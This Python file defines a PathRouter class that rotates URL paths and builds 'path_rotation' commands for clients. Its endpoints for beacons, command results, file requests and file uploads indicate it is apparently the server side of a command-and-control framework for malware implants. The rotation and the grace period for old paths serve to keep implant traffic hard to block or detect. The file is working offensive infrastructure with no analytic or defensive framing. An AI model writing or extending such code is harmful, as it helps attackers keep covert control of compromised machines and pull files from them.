import json
import logging
import datetime

logger = logging.getLogger(__name__)

class PathRouter:
    """Manages URL path routing and rotation with modular path support"""
    
    def __init__(self, path_manager):
        self.path_manager = path_manager
        self.path_mapping = {}
        self.update_path_mapping()
    
    def update_path_mapping(self):
        """Update path mapping after rotation to include all paths in the pool"""
        self.path_mapping = {}
        
        # Add current paths to mapping
        current_paths = self.path_manager.get_current_paths()
        
        # Map specific operation paths
        for key, path in current_paths.items():
            if key != "path_pool":  # Skip the path_pool itself
                self.path_mapping[path] = key
                # Log the mapping for debugging
                logger.debug(f"Mapped {path} to {key}")
        
        # Map all paths in the pool to "pool_path" type
        if "path_pool" in current_paths and isinstance(current_paths["path_pool"], list):
            for path in current_paths["path_pool"]:
                if path not in self.path_mapping:  # Don't overwrite specific mappings
                    self.path_mapping[path] = "pool_path"
                    logger.debug(f"Mapped pool path {path} to pool_path type")
        
        # Also add previous rotation's paths for graceful transition
        if self.path_manager.rotation_counter > 0:
            previous_paths = self.path_manager.get_path_by_rotation_id(self.path_manager.rotation_counter - 1)
            if previous_paths:
                for key, path in previous_paths.items():
                    if key != "path_pool" and path not in self.path_mapping:  # Don't overwrite current paths
                        self.path_mapping[path] = f"previous_{key}"
                        logger.debug(f"Mapped previous path {path} to previous_{key}")
                
                # Also map previous path pool
                if "path_pool" in previous_paths and isinstance(previous_paths["path_pool"], list):
                    for path in previous_paths["path_pool"]:
                        if path not in self.path_mapping:  # Don't overwrite current mappings
                            self.path_mapping[path] = "previous_pool_path"
                            logger.debug(f"Mapped previous pool path {path} to previous_pool_path type")
    
    def check_rotation(self):
        """Check if rotation is needed and update mapping if it is"""
        if self.path_manager.check_rotation():
            self.update_path_mapping()
            return True
        return False
    
    def get_endpoint_type(self, path):
        """Get the endpoint type for a given path"""
        # Check in current path mapping (includes specific paths and pool paths)
        if path in self.path_mapping:
            return self.path_mapping[path]
        
        # If not found, check older rotations
        for rotation_id in range(max(0, self.path_manager.rotation_counter - 5), self.path_manager.rotation_counter):
            paths = self.path_manager.get_path_by_rotation_id(rotation_id)
            if paths:
                # Check specific paths
                for key, old_path in paths.items():
                    if key != "path_pool" and old_path == path:
                        return f"old_{key}"
                
                # Check path pool
                if "path_pool" in paths and isinstance(paths["path_pool"], list):
                    if path in paths["path_pool"]:
                        return "old_pool_path"
        
        # Not found in any paths
        return None
    
    def is_valid_path(self, path):
        """Check if a path is valid (in any current or previous paths)"""
        return self.get_endpoint_type(path) is not None
    
    def get_current_paths(self):
        """Get the current active paths"""
        return self.path_manager.get_current_paths()
    
    def get_rotation_info(self):
        """Get information about the current rotation state"""
        return self.path_manager.get_rotation_info()
    
    def create_path_rotation_command(self):
        """Create a command to update client with new path rotation info"""
        rotation_info = self.path_manager.get_rotation_info()
        
        # Create a simplified dictionary with paths needed
        paths_dict = {
            "beacon_path": rotation_info["current_paths"]["beacon_path"],
            "cmd_result_path": rotation_info["current_paths"]["cmd_result_path"],
            "file_request_path": rotation_info["current_paths"]["file_request_path"],
            "file_upload_path": rotation_info["current_paths"]["file_upload_path"]
        }
        
        # Add the full path pool if available
        if "path_pool" in rotation_info["current_paths"]:
            paths_dict["path_pool"] = rotation_info["current_paths"]["path_pool"]
        
        return {
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "path_rotation",
            "args": json.dumps({
                "rotation_id": rotation_info["current_rotation_id"],
                "next_rotation_time": rotation_info["next_rotation_time"],
                "paths": paths_dict
            })
        }